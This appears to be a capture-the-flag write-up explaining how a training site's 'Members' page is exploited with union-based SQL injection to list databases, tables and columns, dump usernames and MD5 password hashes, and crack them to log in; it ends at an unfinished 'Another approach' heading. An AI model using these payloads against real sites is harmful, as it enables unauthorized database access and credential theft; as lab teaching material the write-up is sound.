## Flag

```
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

## How to find the flag

Knowing that this database is vulnerable to sql injections. We can go to any page which is vulnerable to sql injections like **Members.** Here we will exploit as much as we can the sql injection.

1. **Retrieving information:**
    
    First we should list all the databases inside this webserver. We can do it using the following command:
    
    ```sql
    1 union select schema_name, 2 from information_schema.schemata
    ```
    
    Here we can see that there is a database named Member_Brute_Force.
    
2. **Retrieving database tables:**
    
    In order to get the tables of this database we should get Member_Brute_Force string in hexadecimal:
    
    ```sql
    1 union select table_name, 2 from information_schema.tables where table_schema=0x4d656d6265725f42727574655f466f726365
    ```
    
3. **Finding Columns in the “db_default” table:**
    
    The important table here is db_default, we should list the columns inside of this table:
    
    ```sql
    1 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name=0x64625f64656661756c74
    ```
    
    This will give use two important fields, username and password.
    
4. **Extracting data:**
    
     Here we will choose both columns and desplay them:
    
    ```sql
    1 UNION SELECT username, password FROM Member_Brute_Force.db_default
    ```
    
    As we can see we get the users **root** and **admin**. If we decrypt the password using MD5 decrypter we get that the password is **shadow**. Now if we go to the main page in sign in we can use these credentials to get the flag.
    

## Another approach

Knowing that this methos is based more in sql injection than brute force i will provide another way to get the password too.
